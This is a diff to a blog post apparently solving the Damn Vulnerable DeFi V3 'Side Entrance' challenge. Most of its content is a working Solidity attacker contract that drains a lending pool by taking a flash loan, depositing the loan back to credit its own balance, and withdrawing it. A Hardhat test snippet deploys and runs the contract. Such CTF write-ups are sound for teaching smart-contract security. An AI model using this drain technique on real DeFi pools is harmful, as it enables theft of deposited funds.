@@ -1,6 +1,6 @@
 ---
 title: Damn Vulnerable DeFi V3 - Side Entrance - Solution
-date: '2023-11-26'
+date: '2024-07-04'
 tags: ['security', 'solidity', 'ctfs']
 draft: false
 summary: Solution to the Damn Vulnerable DeFi V3 - Side Entrance CTF
@@ -42,7 +42,7 @@ contract SideEntranceLenderPool {
 
     function withdraw() external {
         uint256 amount = balances[msg.sender];
-
+        
         delete balances[msg.sender];
         emit Withdraw(msg.sender, amount);
 
@@ -62,44 +62,60 @@ contract SideEntranceLenderPool {
 
 ## Solution
 
-This challenge is conveniently solved via Remix. First, we deploy the contract from Remix's default account. Next, we call `deposit`, specifying a transaction value of `42000000000000000000 == 42 ether` to fund the pool with its initial balance. (The original assignment described in Damn Vulnerable DeFi specifies a pool with an initial balance of 1000 ether instead of 42 ether. However, bumping the contract's balance up to 1000 ether is quite tedious in Remix. Since the exact pool balance doesn't really matter, we'll assume a pool balance of 42 ether instead of 1000 ether for convenience.)
+To solve this level, we can simply:
 
-With the initial setup completed, we now have to find a way to drain all funds from the contract using a different account than the one we used for the deposit.
+1. Request a flash loan.
+2. Deposit the borrowed assets back into the pool to increase our balance in the `balances` mapping.
+3. Withdraw all funds we "deposited" earlier.
 
-To achieve that, we can deploy an attacker contract that will perform the following steps:
-
-1. Call `flashLoan` to borrow 42 ether.
-2. Pay back the flash loan by calling `deposit` with a value of 42 ether. Notice that this will register a deposit balance of 42 ether for the attacker contract!
-3. Call `withdraw` to drain 42 ether from the pool.
-
-All of the above steps can be performed with a single function call to `attack` using the contract shown below. Notice that
-
-1. you must specify the victim contract's address during the deployment of the attacker contract and
-2. you must specify `amount = 42000000000000000000` when calling `attack`.
+_SideEntranceAttacker.sol_
 
 ```solidity
-// SPDX-License-Identifier: UNLICENSE
+// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "./SideEntranceLenderPool.sol";
 
-contract SideEntranceLenderPoolAttacker {
+interface IPool {
+    function flashLoan(uint256 amount) external;
+    function deposit() external payable;
+    function withdraw() external;
+}
 
-    SideEntranceLenderPool public sideEntranceLenderPool;
 
-    constructor(SideEntranceLenderPool _sideEntranceLenderPool) {
-        sideEntranceLenderPool = _sideEntranceLenderPool;
+contract SideEntranceAttacker {
+
+    IPool immutable pool;
+    address immutable player;
+
+    constructor(address _pool, address _player){
+        pool = IPool(_pool);
+        player = _player;
     }
 
     receive() external payable {}
 
-    function execute() external payable {
-        sideEntranceLenderPool.deposit{value: msg.value}();
+    function attack() external {
+        pool.flashLoan(address(pool).balance);
+        pool.withdraw();
+        (bool success, ) = player.call{value: address(this).balance}("");
     }
 
-    function attack(uint256 amount) external {
-        sideEntranceLenderPool.flashLoan(amount);
-        sideEntranceLenderPool.withdraw();
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
     }
 }
+```
+
+_side-entrance.challenge.js_
+
+```javascript
+...
+it('Execution', async function () {
+    /** CODE YOUR SOLUTION HERE */
+    let attacker = await (await ethers.getContractFactory('SideEntranceAttacker', player)).deploy(
+        pool.address, player.address
+    );
+    await attacker.attack();
+});
+...
 ```
